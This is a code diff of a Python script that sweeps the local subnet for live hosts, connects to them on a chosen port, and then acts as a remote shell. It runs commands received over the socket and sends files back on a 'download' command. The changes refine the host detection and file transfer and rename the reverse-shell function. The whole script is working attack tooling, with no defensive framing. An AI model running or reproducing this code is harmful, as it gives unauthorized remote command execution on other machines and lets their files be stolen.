@@ -1,6 +1,8 @@
 #!/bin/python
 
+
 import threading
+import multiprocessing
 import subprocess
 import time
 import os
@@ -9,6 +11,10 @@ import socket
 import platform
 import re
 
+
+class ExitException(Exception):
+   def __init__(self, message):
+      super().__init__(message)
 
 def socket_create():
    return socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -29,25 +35,25 @@ def get_network_info():
 def ping_ip(ip, live_ips):
    ##get the correct ping command
    if "Windows" in platform.system():
-      ping_response = os.popen("ping -n 1 {}".format(ip)).read()
+      ping_response = os.popen("ping -n 1 -w 1000 {}".format(ip)).read()
    elif "Linux" in platform.system():
-      ping_response = os.popen("ping -c 1 {}".format(ip)).read()
+      ping_response = os.popen("ping -c 1 -w 1 {}".format(ip)).read()
 
    ##check if the computer is live
-   if "Destination Host Unreachable" in ping_response.title():
-      pass
-   else:
+   if "TTL" in ping_response.upper():
       live_ips.append(ip)
+      return live_ips
+   else:
+   	pass
    return live_ips
 
 
-
 def ping_sweep(ip_address):
-   live_ips = []
+   live_ips = list()   
    ##sweep through ip range 2 - 255, to find reachable targets
    for ip in range(2,255):
       ip = '.'.join(ip_address.split(".")[:-1]) + "." + str(ip)
-      if ip == ip_address:
+      if ip == "":
          continue
       else:
          thread = threading.Thread(
@@ -56,6 +62,22 @@ def ping_sweep(ip_address):
          )
          thread.start()
    return live_ips
+
+##def ping_sweep(ip_address):
+##   manager = multiprocessing.Manager()
+##   live_ips = manager.list()   
+##   ##sweep through ip range 2 - 255, to find reachable targets
+##   for ip in range(2,255):
+##      ip = '.'.join(ip_address.split(".")[:-1]) + "." + str(ip)
+##      if ip == ip_address:
+##         continue
+##      else:
+##         ping_process = multiprocessing.Process(
+##            target = ping_ip,
+##            args = (ip, live_ips,)
+##         )
+##         ping_process.start()
+##   return list(live_ips)
 
 
 def scan_for_reverse_shell(live_ips, port):
@@ -69,10 +91,10 @@ def scan_for_reverse_shell(live_ips, port):
          return s
       except Exception as ex:
          s.close()
-         #print(ex.__str__())
-      #finally:
+         print(ex.__str__())
+      finally:
          #s.close()
-         #print("Tried {}".format(ip))
+         print("Tried {}".format(ip))
 
 
 def change_dir(s, filepath):
@@ -85,7 +107,7 @@ def transfer_file(s, filename):
       FILE = open(filename, "rb")
       while True:
          data = FILE.read(1024)
-         if not data.decode().strip():
+         if not data:
             break
          else:
             s.send(data)
@@ -95,16 +117,16 @@ def transfer_file(s, filename):
       s.send("Unable to retrieve {}".format(filename).encode())
 
 
-def set_up_reverse_shell(s, command):
+def send_terminal_output(s, command):
    cmd = subprocess.Popen(
-      command.decode(),
-      shell=True,
-      stdin=subprocess.PIPE,
-      stdout=subprocess.PIPE,
-      stderr=subprocess.PIPE
+   	command.decode(),
+   	shell=True,
+   	stdout=subprocess.PIPE,
+   	stderr=subprocess.PIPE,
+   	stdin=subprocess.PIPE
    )
-   stderr, stdout = cmd.communicate()
-   if stdout.decode().strip() or stderr.decode().strip():
+   stdout, stderr = cmd.communicate()
+   if stderr.decode() or stdout.decode():
       s.send(stdout + stderr)
    else:
       s.send("command executed...".encode())
@@ -121,7 +143,7 @@ if __name__=="__main__":
          try:
             command = s.recv(2048)
             if "exit" in command.decode():
-               raise Exception()
+               raise ExitException("Exiting shell...")
             elif "download" in command.decode():
                filename = command.decode().split("download")[1].strip()
                transfer_file(s, filename)
@@ -131,9 +153,12 @@ if __name__=="__main__":
             elif not command.decode().strip():
                s.send("Enter a command...".encode())
             else:
-               set_up_reverse_shell(s, command)
+               send_terminal_output(s, command)
          except KeyboardInterrupt:
             break
-         except:
-            break
+         except ExitException:
+         	s.send("Exiting shell...".encode())
+         	break
+         except Exception as ex:
+         	break
       s.close()
